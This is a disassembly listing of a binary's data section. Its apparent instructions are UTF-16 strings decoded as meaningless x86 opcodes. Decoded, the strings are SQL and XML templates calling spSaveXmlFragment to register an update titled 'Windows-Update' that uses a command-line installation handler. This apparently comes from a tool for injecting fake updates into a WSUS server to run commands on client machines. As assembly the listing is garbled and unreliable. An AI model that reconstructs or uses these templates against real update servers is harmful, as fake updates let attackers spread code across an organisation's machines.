  407e9e:	00 01                	add    %al,(%ecx)
  407ea0:	1f                   	pop    %ds
  407ea1:	45                   	inc    %ebp
  407ea2:	00 72 00             	add    %dh,0x0(%edx)
  407ea5:	72 00                	jb     0x407ea7
  407ea7:	6f                   	outsl  %ds:(%esi),(%dx)
  407ea8:	00 72 00             	add    %dh,0x0(%edx)
  407eab:	20 00                	and    %al,(%eax)
  407ead:	4d                   	dec    %ebp
  407eae:	00 65 00             	add    %ah,0x0(%ebp)
  407eb1:	73 00                	jae    0x407eb3
  407eb3:	73 00                	jae    0x407eb5
  407eb5:	61                   	popa
  407eb6:	00 67 00             	add    %ah,0x0(%edi)
  407eb9:	65 00 3a             	add    %bh,%gs:(%edx)
  407ebc:	00 20                	add    %ah,(%eax)
  407ebe:	00 00                	add    %al,(%eax)
  407ec0:	31 65 00             	xor    %esp,0x0(%ebp)
  407ec3:	78 00                	js     0x407ec5
  407ec5:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  407ec9:	20 00                	and    %al,(%eax)
  407ecb:	73 00                	jae    0x407ecd
  407ecd:	70 00                	jo     0x407ecf
  407ecf:	53                   	push   %ebx
  407ed0:	00 61 00             	add    %ah,0x0(%ecx)
  407ed3:	76 00                	jbe    0x407ed5
  407ed5:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  407ed9:	6d                   	insl   (%dx),%es:(%edi)
  407eda:	00 6c 00 46          	add    %ch,0x46(%eax,%eax,1)
  407ede:	00 72 00             	add    %dh,0x0(%edx)
  407ee1:	61                   	popa
  407ee2:	00 67 00             	add    %ah,0x0(%edi)
  407ee5:	6d                   	insl   (%dx),%es:(%edi)
  407ee6:	00 65 00             	add    %ah,0x0(%ebp)
  407ee9:	6e                   	outsb  %ds:(%esi),(%dx)
  407eea:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  407eee:	00 27                	add    %ah,(%edi)
  407ef0:	00 01                	add    %al,(%ecx)
  407ef2:	4f                   	dec    %edi
  407ef3:	27                   	daa
  407ef4:	00 2c 00             	add    %ch,(%eax,%eax,1)
  407ef7:	32 00                	xor    (%eax),%al
  407ef9:	30 00                	xor    %al,(%eax)
  407efb:	32 00                	xor    (%eax),%al
  407efd:	2c 00                	sub    $0x0,%al
  407eff:	31 00                	xor    %eax,(%eax)
  407f01:	2c 00                	sub    $0x0,%al
  407f03:	4e                   	dec    %esi
  407f04:	00 27                	add    %ah,(%edi)
  407f06:	00 26                	add    %ah,(%esi)
  407f08:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  407f0c:	00 3b                	add    %bh,(%ebx)
  407f0e:	00 55 00             	add    %dl,0x0(%ebp)
  407f11:	70 00                	jo     0x407f13
  407f13:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  407f17:	74 00                	je     0x407f19
  407f19:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  407f1d:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  407f21:	6e                   	outsb  %ds:(%esi),(%dx)
  407f22:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  407f26:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  407f2a:	00 20                	add    %ah,(%eax)
  407f2c:	00 55 00             	add    %dl,0x0(%ebp)
  407f2f:	70 00                	jo     0x407f31
  407f31:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  407f35:	74 00                	je     0x407f37
  407f37:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  407f3b:	44                   	inc    %esp
  407f3c:	00 3d 00 22 00 01    	add    %bh,0x1002200
  407f42:	82 37 22             	xorb   $0x22,(%edi)
  407f45:	00 20                	add    %ah,(%eax)
  407f47:	00 52 00             	add    %dl,0x0(%edx)
  407f4a:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  407f4e:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  407f54:	6f                   	outsl  %ds:(%esi),(%dx)
  407f55:	00 6e 00             	add    %ch,0x0(%esi)
  407f58:	4e                   	dec    %esi
  407f59:	00 75 00             	add    %dh,0x0(%ebp)
  407f5c:	6d                   	insl   (%dx),%es:(%edi)
  407f5d:	00 62 00             	add    %ah,0x0(%edx)
  407f60:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407f64:	3d 00 22 00 32       	cmp    $0x32002200,%eax
  407f69:	00 30                	add    %dh,(%eax)
  407f6b:	00 32                	add    %dh,(%edx)
  407f6d:	00 22                	add    %ah,(%edx)
  407f6f:	00 20                	add    %ah,(%eax)
  407f71:	00 2f                	add    %ch,(%edi)
  407f73:	00 26                	add    %ah,(%esi)
  407f75:	00 67 00             	add    %ah,0x0(%edi)
  407f78:	74 00                	je     0x407f7a
  407f7a:	3b 00                	cmp    (%eax),%eax
  407f7c:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  407f81:	00 3b                	add    %bh,(%ebx)
  407f83:	00 50 00             	add    %dl,0x0(%eax)
  407f86:	72 00                	jb     0x407f88
  407f88:	6f                   	outsl  %ds:(%esi),(%dx)
  407f89:	00 70 00             	add    %dh,0x0(%eax)
  407f8c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407f90:	74 00                	je     0x407f92
  407f92:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  407f98:	20 00                	and    %al,(%eax)
  407f9a:	55                   	push   %ebp
  407f9b:	00 70 00             	add    %dh,0x0(%eax)
  407f9e:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  407fa2:	74 00                	je     0x407fa4
  407fa4:	65 00 54 00 79       	add    %dl,%gs:0x79(%eax,%eax,1)
  407fa9:	00 70 00             	add    %dh,0x0(%eax)
  407fac:	65 00 3d 00 22 00 53 	add    %bh,%gs:0x53002200
  407fb3:	00 6f 00             	add    %ch,0x0(%edi)
  407fb6:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  407fbb:	00 61 00             	add    %ah,0x0(%ecx)
  407fbe:	72 00                	jb     0x407fc0
  407fc0:	65 00 22             	add    %ah,%gs:(%edx)
  407fc3:	00 20                	add    %ah,(%eax)
  407fc5:	00 2f                	add    %ch,(%edi)
  407fc7:	00 26                	add    %ah,(%esi)
  407fc9:	00 67 00             	add    %ah,0x0(%edi)
  407fcc:	74 00                	je     0x407fce
  407fce:	3b 00                	cmp    (%eax),%eax
  407fd0:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  407fd5:	00 3b                	add    %bh,(%ebx)
  407fd7:	00 52 00             	add    %dl,0x0(%edx)
  407fda:	65 00 6c 00 61       	add    %ch,%gs:0x61(%eax,%eax,1)
  407fdf:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  407fe3:	00 6f 00             	add    %ch,0x0(%edi)
  407fe6:	6e                   	outsb  %ds:(%esi),(%dx)
  407fe7:	00 73 00             	add    %dh,0x0(%ebx)
  407fea:	68 00 69 00 70       	push   $0x70006900
  407fef:	00 73 00             	add    %dh,0x0(%ebx)
  407ff2:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  407ff6:	74 00                	je     0x407ff8
  407ff8:	3b 00                	cmp    (%eax),%eax
  407ffa:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  407fff:	00 3b                	add    %bh,(%ebx)
  408001:	00 2f                	add    %ch,(%edi)
  408003:	00 52 00             	add    %dl,0x0(%edx)
  408006:	65 00 6c 00 61       	add    %ch,%gs:0x61(%eax,%eax,1)
  40800b:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40800f:	00 6f 00             	add    %ch,0x0(%edi)
  408012:	6e                   	outsb  %ds:(%esi),(%dx)
  408013:	00 73 00             	add    %dh,0x0(%ebx)
  408016:	68 00 69 00 70       	push   $0x70006900
  40801b:	00 73 00             	add    %dh,0x0(%ebx)
  40801e:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  408022:	74 00                	je     0x408024
  408024:	3b 00                	cmp    (%eax),%eax
  408026:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40802b:	00 3b                	add    %bh,(%ebx)
  40802d:	00 41 00             	add    %al,0x0(%ecx)
  408030:	70 00                	jo     0x408032
  408032:	70 00                	jo     0x408034
  408034:	6c                   	insb   (%dx),%es:(%edi)
  408035:	00 69 00             	add    %ch,0x0(%ecx)
  408038:	63 00                	arpl   %eax,(%eax)
  40803a:	61                   	popa
  40803b:	00 62 00             	add    %ah,0x0(%edx)
  40803e:	69 00 6c 00 69 00    	imul   $0x69006c,(%eax),%eax
  408044:	74 00                	je     0x408046
  408046:	79 00                	jns    0x408048
  408048:	52                   	push   %edx
  408049:	00 75 00             	add    %dh,0x0(%ebp)
  40804c:	6c                   	insb   (%dx),%es:(%edi)
  40804d:	00 65 00             	add    %ah,0x0(%ebp)
  408050:	73 00                	jae    0x408052
  408052:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  408056:	74 00                	je     0x408058
  408058:	3b 00                	cmp    (%eax),%eax
  40805a:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40805f:	00 3b                	add    %bh,(%ebx)
  408061:	00 49 00             	add    %cl,0x0(%ecx)
  408064:	73 00                	jae    0x408066
  408066:	49                   	dec    %ecx
  408067:	00 6e 00             	add    %ch,0x0(%esi)
  40806a:	73 00                	jae    0x40806c
  40806c:	74 00                	je     0x40806e
  40806e:	61                   	popa
  40806f:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  408073:	00 65 00             	add    %ah,0x0(%ebp)
  408076:	64 00 26             	add    %ah,%fs:(%esi)
  408079:	00 67 00             	add    %ah,0x0(%edi)
  40807c:	74 00                	je     0x40807e
  40807e:	3b 00                	cmp    (%eax),%eax
  408080:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  408085:	00 3b                	add    %bh,(%ebx)
  408087:	00 46 00             	add    %al,0x0(%esi)
  40808a:	61                   	popa
  40808b:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40808f:	00 65 00             	add    %ah,0x0(%ebp)
  408092:	20 00                	and    %al,(%eax)
  408094:	2f                   	das
  408095:	00 26                	add    %ah,(%esi)
  408097:	00 67 00             	add    %ah,0x0(%edi)
  40809a:	74 00                	je     0x40809c
  40809c:	3b 00                	cmp    (%eax),%eax
  40809e:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  4080a3:	00 3b                	add    %bh,(%ebx)
  4080a5:	00 2f                	add    %ch,(%edi)
  4080a7:	00 49 00             	add    %cl,0x0(%ecx)
  4080aa:	73 00                	jae    0x4080ac
  4080ac:	49                   	dec    %ecx
  4080ad:	00 6e 00             	add    %ch,0x0(%esi)
  4080b0:	73 00                	jae    0x4080b2
  4080b2:	74 00                	je     0x4080b4
  4080b4:	61                   	popa
  4080b5:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  4080b9:	00 65 00             	add    %ah,0x0(%ebp)
  4080bc:	64 00 26             	add    %ah,%fs:(%esi)
  4080bf:	00 67 00             	add    %ah,0x0(%edi)
  4080c2:	74 00                	je     0x4080c4
  4080c4:	3b 00                	cmp    (%eax),%eax
  4080c6:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  4080cb:	00 3b                	add    %bh,(%ebx)
  4080cd:	00 49 00             	add    %cl,0x0(%ecx)
  4080d0:	73 00                	jae    0x4080d2
  4080d2:	49                   	dec    %ecx
  4080d3:	00 6e 00             	add    %ch,0x0(%esi)
  4080d6:	73 00                	jae    0x4080d8
  4080d8:	74 00                	je     0x4080da
  4080da:	61                   	popa
  4080db:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  4080df:	00 61 00             	add    %ah,0x0(%ecx)
  4080e2:	62 00                	bound  %eax,(%eax)
  4080e4:	6c                   	insb   (%dx),%es:(%edi)
  4080e5:	00 65 00             	add    %ah,0x0(%ebp)
  4080e8:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  4080ec:	74 00                	je     0x4080ee
  4080ee:	3b 00                	cmp    (%eax),%eax
  4080f0:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  4080f5:	00 3b                	add    %bh,(%ebx)
  4080f7:	00 54 00 72          	add    %dl,0x72(%eax,%eax,1)
  4080fb:	00 75 00             	add    %dh,0x0(%ebp)
  4080fe:	65 00 20             	add    %ah,%gs:(%eax)
  408101:	00 2f                	add    %ch,(%edi)
  408103:	00 26                	add    %ah,(%esi)
  408105:	00 67 00             	add    %ah,0x0(%edi)
  408108:	74 00                	je     0x40810a
  40810a:	3b 00                	cmp    (%eax),%eax
  40810c:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  408111:	00 3b                	add    %bh,(%ebx)
  408113:	00 2f                	add    %ch,(%edi)
  408115:	00 49 00             	add    %cl,0x0(%ecx)
  408118:	73 00                	jae    0x40811a
  40811a:	49                   	dec    %ecx
  40811b:	00 6e 00             	add    %ch,0x0(%esi)
  40811e:	73 00                	jae    0x408120
  408120:	74 00                	je     0x408122
  408122:	61                   	popa
  408123:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  408127:	00 61 00             	add    %ah,0x0(%ecx)
  40812a:	62 00                	bound  %eax,(%eax)
  40812c:	6c                   	insb   (%dx),%es:(%edi)
  40812d:	00 65 00             	add    %ah,0x0(%ebp)
  408130:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  408134:	74 00                	je     0x408136
  408136:	3b 00                	cmp    (%eax),%eax
  408138:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40813d:	00 3b                	add    %bh,(%ebx)
  40813f:	00 2f                	add    %ch,(%edi)
  408141:	00 41 00             	add    %al,0x0(%ecx)
  408144:	70 00                	jo     0x408146
  408146:	70 00                	jo     0x408148
  408148:	6c                   	insb   (%dx),%es:(%edi)
  408149:	00 69 00             	add    %ch,0x0(%ecx)
  40814c:	63 00                	arpl   %eax,(%eax)
  40814e:	61                   	popa
  40814f:	00 62 00             	add    %ah,0x0(%edx)
  408152:	69 00 6c 00 69 00    	imul   $0x69006c,(%eax),%eax
  408158:	74 00                	je     0x40815a
  40815a:	79 00                	jns    0x40815c
  40815c:	52                   	push   %edx
  40815d:	00 75 00             	add    %dh,0x0(%ebp)
  408160:	6c                   	insb   (%dx),%es:(%edi)
  408161:	00 65 00             	add    %ah,0x0(%ebp)
  408164:	73 00                	jae    0x408166
  408166:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40816a:	74 00                	je     0x40816c
  40816c:	3b 00                	cmp    (%eax),%eax
  40816e:	27                   	daa
  40816f:	00 2c 00             	add    %ch,(%eax,%eax,1)
  408172:	4e                   	dec    %esi
  408173:	00 55 00             	add    %dl,0x0(%ebp)
  408176:	4c                   	dec    %esp
  408177:	00 4c 00 01          	add    %cl,0x1(%eax,%eax,1)
  40817b:	81 31 27 00 2c 00    	xorl   $0x2c0027,(%ecx)
  408181:	32 00                	xor    (%eax),%al
  408183:	30 00                	xor    %al,(%eax)
  408185:	32 00                	xor    (%eax),%al
  408187:	2c 00                	sub    $0x0,%al
  408189:	34 00                	xor    $0x0,%al
  40818b:	2c 00                	sub    $0x0,%al
  40818d:	4e                   	dec    %esi
  40818e:	00 27                	add    %ah,(%edi)
  408190:	00 26                	add    %ah,(%esi)
  408192:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  408196:	00 3b                	add    %bh,(%ebx)
  408198:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40819c:	00 63 00             	add    %ah,0x0(%ebx)
  40819f:	61                   	popa
  4081a0:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  4081a4:	00 7a 00             	add    %bh,0x0(%edx)
  4081a7:	65 00 64 00 50       	add    %ah,%gs:0x50(%eax,%eax,1)
  4081ac:	00 72 00             	add    %dh,0x0(%edx)
  4081af:	6f                   	outsl  %ds:(%esi),(%dx)
  4081b0:	00 70 00             	add    %dh,0x0(%eax)
  4081b3:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4081b7:	74 00                	je     0x4081b9
  4081b9:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  4081bf:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  4081c3:	74 00                	je     0x4081c5
  4081c5:	3b 00                	cmp    (%eax),%eax
  4081c7:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  4081cc:	00 3b                	add    %bh,(%ebx)
  4081ce:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  4081d2:	00 6e 00             	add    %ch,0x0(%esi)
  4081d5:	67 00 75 00          	add    %dh,0x0(%di)
  4081d9:	61                   	popa
  4081da:	00 67 00             	add    %ah,0x0(%edi)
  4081dd:	65 00 26             	add    %ah,%gs:(%esi)
  4081e0:	00 67 00             	add    %ah,0x0(%edi)
  4081e3:	74 00                	je     0x4081e5
  4081e5:	3b 00                	cmp    (%eax),%eax
  4081e7:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4081eb:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  4081f0:	00 3b                	add    %bh,(%ebx)
  4081f2:	00 2f                	add    %ch,(%edi)
  4081f4:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  4081f8:	00 6e 00             	add    %ch,0x0(%esi)
  4081fb:	67 00 75 00          	add    %dh,0x0(%di)
  4081ff:	61                   	popa
  408200:	00 67 00             	add    %ah,0x0(%edi)
  408203:	65 00 26             	add    %ah,%gs:(%esi)
  408206:	00 67 00             	add    %ah,0x0(%edi)
  408209:	74 00                	je     0x40820b
  40820b:	3b 00                	cmp    (%eax),%eax
  40820d:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  408212:	00 3b                	add    %bh,(%ebx)
  408214:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  408218:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  40821c:	00 65 00             	add    %ah,0x0(%ebp)
  40821f:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  408223:	74 00                	je     0x408225
  408225:	3b 00                	cmp    (%eax),%eax
  408227:	57                   	push   %edi
  408228:	00 69 00             	add    %ch,0x0(%ecx)
  40822b:	6e                   	outsb  %ds:(%esi),(%dx)
  40822c:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  408230:	00 77 00             	add    %dh,0x0(%edi)
  408233:	73 00                	jae    0x408235
  408235:	2d 00 55 00 70       	sub    $0x70005500,%eax
  40823a:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40823e:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  408242:	00 26                	add    %ah,(%esi)
  408244:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  408248:	00 3b                	add    %bh,(%ebx)
  40824a:	00 2f                	add    %ch,(%edi)
  40824c:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  408250:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  408254:	00 65 00             	add    %ah,0x0(%ebp)
  408257:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40825b:	74 00                	je     0x40825d
  40825d:	3b 00                	cmp    (%eax),%eax
  40825f:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  408264:	00 3b                	add    %bh,(%ebx)
  408266:	00 2f                	add    %ch,(%edi)
  408268:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40826c:	00 63 00             	add    %ah,0x0(%ebx)
  40826f:	61                   	popa
  408270:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  408274:	00 7a 00             	add    %bh,0x0(%edx)
  408277:	65 00 64 00 50       	add    %ah,%gs:0x50(%eax,%eax,1)
  40827c:	00 72 00             	add    %dh,0x0(%edx)
  40827f:	6f                   	outsl  %ds:(%esi),(%dx)
  408280:	00 70 00             	add    %dh,0x0(%eax)
  408283:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408287:	74 00                	je     0x408289
  408289:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  40828f:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  408293:	74 00                	je     0x408295
  408295:	3b 00                	cmp    (%eax),%eax
  408297:	27                   	daa
  408298:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40829b:	4e                   	dec    %esi
  40829c:	00 55 00             	add    %dl,0x0(%ebp)
  40829f:	4c                   	dec    %esp
  4082a0:	00 4c 00 2c          	add    %cl,0x2c(%eax,%eax,1)
  4082a4:	00 27                	add    %ah,(%edi)
  4082a6:	00 65 00             	add    %ah,0x0(%ebp)
  4082a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4082aa:	00 27                	add    %ah,(%edi)
  4082ac:	00 01                	add    %al,(%ecx)
  4082ae:	81 59 27 00 2c 00 32 	sbbl   $0x32002c00,0x27(%ecx)
  4082b5:	00 30                	add    %dh,(%eax)
  4082b7:	00 32                	add    %dh,(%edx)
  4082b9:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4082bc:	32 00                	xor    (%eax),%al
  4082be:	2c 00                	sub    $0x0,%al
  4082c0:	4e                   	dec    %esi
  4082c1:	00 27                	add    %ah,(%edi)
  4082c3:	00 26                	add    %ah,(%esi)
  4082c5:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  4082c9:	00 3b                	add    %bh,(%ebx)
  4082cb:	00 45 00             	add    %al,0x0(%ebp)
  4082ce:	78 00                	js     0x4082d0
  4082d0:	74 00                	je     0x4082d2
  4082d2:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4082d6:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4082da:	64 00 50 00          	add    %dl,%fs:0x0(%eax)
  4082de:	72 00                	jb     0x4082e0
  4082e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4082e1:	00 70 00             	add    %dh,0x0(%eax)
  4082e4:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4082e8:	74 00                	je     0x4082ea
  4082ea:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  4082f0:	20 00                	and    %al,(%eax)
  4082f2:	44                   	inc    %esp
  4082f3:	00 65 00             	add    %ah,0x0(%ebp)
  4082f6:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  4082fa:	75 00                	jne    0x4082fc
  4082fc:	6c                   	insb   (%dx),%es:(%edi)
  4082fd:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
  408301:	00 72 00             	add    %dh,0x0(%edx)
  408304:	6f                   	outsl  %ds:(%esi),(%dx)
  408305:	00 70 00             	add    %dh,0x0(%eax)
  408308:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40830c:	74 00                	je     0x40830e
  40830e:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  408314:	4c                   	dec    %esp
  408315:	00 61 00             	add    %ah,0x0(%ecx)
  408318:	6e                   	outsb  %ds:(%esi),(%dx)
  408319:	00 67 00             	add    %ah,0x0(%edi)
  40831c:	75 00                	jne    0x40831e
  40831e:	61                   	popa
  40831f:	00 67 00             	add    %ah,0x0(%edi)
  408322:	65 00 3d 00 22 00 65 	add    %bh,%gs:0x65002200
  408329:	00 6e 00             	add    %ch,0x0(%esi)
  40832c:	22 00                	and    (%eax),%al
  40832e:	20 00                	and    %al,(%eax)
  408330:	48                   	dec    %eax
  408331:	00 61 00             	add    %ah,0x0(%ecx)
  408334:	6e                   	outsb  %ds:(%esi),(%dx)
  408335:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  408339:	00 65 00             	add    %ah,0x0(%ebp)
  40833c:	72 00                	jb     0x40833e
  40833e:	3d 00 22 00 68       	cmp    $0x68002200,%eax
  408343:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  408347:	00 70 00             	add    %dh,0x0(%eax)
  40834a:	3a 00                	cmp    (%eax),%al
  40834c:	2f                   	das
  40834d:	00 2f                	add    %ch,(%edi)
  40834f:	00 73 00             	add    %dh,0x0(%ebx)
  408352:	63 00                	arpl   %eax,(%eax)
  408354:	68 00 65 00 6d       	push   $0x6d006500
  408359:	00 61 00             	add    %ah,0x0(%ecx)
  40835c:	73 00                	jae    0x40835e
  40835e:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  408362:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  408368:	6f                   	outsl  %ds:(%esi),(%dx)
  408369:	00 73 00             	add    %dh,0x0(%ebx)
  40836c:	6f                   	outsl  %ds:(%esi),(%dx)
  40836d:	00 66 00             	add    %ah,0x0(%esi)
  408370:	74 00                	je     0x408372
  408372:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  408376:	6f                   	outsl  %ds:(%esi),(%dx)
  408377:	00 6d 00             	add    %ch,0x0(%ebp)
  40837a:	2f                   	das
  40837b:	00 6d 00             	add    %ch,0x0(%ebp)
  40837e:	73 00                	jae    0x408380
  408380:	75 00                	jne    0x408382
  408382:	73 00                	jae    0x408384
  408384:	2f                   	das
  408385:	00 32                	add    %dh,(%edx)
  408387:	00 30                	add    %dh,(%eax)
  408389:	00 30                	add    %dh,(%eax)
  40838b:	00 32                	add    %dh,(%edx)
  40838d:	00 2f                	add    %ch,(%edi)
  40838f:	00 31                	add    %dh,(%ecx)
  408391:	00 32                	add    %dh,(%edx)
  408393:	00 2f                	add    %ch,(%edi)
  408395:	00 55 00             	add    %dl,0x0(%ebp)
  408398:	70 00                	jo     0x40839a
  40839a:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40839e:	74 00                	je     0x4083a0
  4083a0:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  4083a4:	61                   	popa
  4083a5:	00 6e 00             	add    %ch,0x0(%esi)
  4083a8:	64 00 6c 00 65       	add    %ch,%fs:0x65(%eax,%eax,1)
  4083ad:	00 72 00             	add    %dh,0x0(%edx)
  4083b0:	73 00                	jae    0x4083b2
  4083b2:	2f                   	das
  4083b3:	00 43 00             	add    %al,0x0(%ebx)
  4083b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4083b7:	00 6d 00             	add    %ch,0x0(%ebp)
  4083ba:	6d                   	insl   (%dx),%es:(%edi)
  4083bb:	00 61 00             	add    %ah,0x0(%ecx)
  4083be:	6e                   	outsb  %ds:(%esi),(%dx)
  4083bf:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  4083c3:	00 69 00             	add    %ch,0x0(%ecx)
  4083c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4083c7:	00 65 00             	add    %ah,0x0(%ebp)
  4083ca:	49                   	dec    %ecx
  4083cb:	00 6e 00             	add    %ch,0x0(%esi)
  4083ce:	73 00                	jae    0x4083d0
  4083d0:	74 00                	je     0x4083d2
  4083d2:	61                   	popa
  4083d3:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  4083d7:	00 61 00             	add    %ah,0x0(%ecx)
  4083da:	74 00                	je     0x4083dc
  4083dc:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4083e2:	22 00                	and    (%eax),%al
  4083e4:	20 00                	and    %al,(%eax)
  4083e6:	4d                   	dec    %ebp
  4083e7:	00 61 00             	add    %ah,0x0(%ecx)
  4083ea:	78 00                	js     0x4083ec
  4083ec:	44                   	inc    %esp
  4083ed:	00 6f 00             	add    %ch,0x0(%edi)
  4083f0:	77 00                	ja     0x4083f2
  4083f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4083f3:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  4083f7:	00 61 00             	add    %ah,0x0(%ecx)
  4083fa:	64 00 53 00          	add    %dl,%fs:0x0(%ebx)
  4083fe:	69 00 7a 00 65 00    	imul   $0x65007a,(%eax),%eax
  408404:	3d 00 22 00 01       	cmp    $0x1002200,%eax
  408409:	80 f5 22             	xor    $0x22,%ch
  40840c:	00 26                	add    %ah,(%esi)
  40840e:	00 67 00             	add    %ah,0x0(%edi)
  408411:	74 00                	je     0x408413
  408413:	3b 00                	cmp    (%eax),%eax
  408415:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40841a:	00 3b                	add    %bh,(%ebx)
  40841c:	00 49 00             	add    %cl,0x0(%ecx)
  40841f:	6e                   	outsb  %ds:(%esi),(%dx)
  408420:	00 73 00             	add    %dh,0x0(%ebx)
  408423:	74 00                	je     0x408425
  408425:	61                   	popa
  408426:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40842a:	00 61 00             	add    %ah,0x0(%ecx)
  40842d:	74 00                	je     0x40842f
  40842f:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  408435:	42                   	inc    %edx
  408436:	00 65 00             	add    %ah,0x0(%ebp)
  408439:	68 00 61 00 76       	push   $0x76006100
  40843e:	00 69 00             	add    %ch,0x0(%ecx)
  408441:	6f                   	outsl  %ds:(%esi),(%dx)
  408442:	00 72 00             	add    %dh,0x0(%edx)
  408445:	20 00                	and    %al,(%eax)
  408447:	52                   	push   %edx
  408448:	00 65 00             	add    %ah,0x0(%ebp)
  40844b:	62 00                	bound  %eax,(%eax)
  40844d:	6f                   	outsl  %ds:(%esi),(%dx)
  40844e:	00 6f 00             	add    %ch,0x0(%edi)
  408451:	74 00                	je     0x408453
  408453:	42                   	inc    %edx
  408454:	00 65 00             	add    %ah,0x0(%ebp)
  408457:	68 00 61 00 76       	push   $0x76006100
  40845c:	00 69 00             	add    %ch,0x0(%ecx)
  40845f:	6f                   	outsl  %ds:(%esi),(%dx)
  408460:	00 72 00             	add    %dh,0x0(%edx)
